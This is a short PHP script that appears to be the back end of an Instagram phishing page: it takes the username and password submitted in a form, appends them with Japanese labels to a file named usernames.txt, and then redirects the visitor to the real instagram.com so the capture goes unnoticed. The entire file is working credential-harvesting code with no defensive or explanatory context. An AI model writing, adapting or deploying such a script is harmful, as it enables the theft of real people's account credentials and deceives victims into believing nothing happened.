<?php

file_put_contents("usernames.txt", "Instagram　ユーザー名: " . $_POST['username'] . " パスワード: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>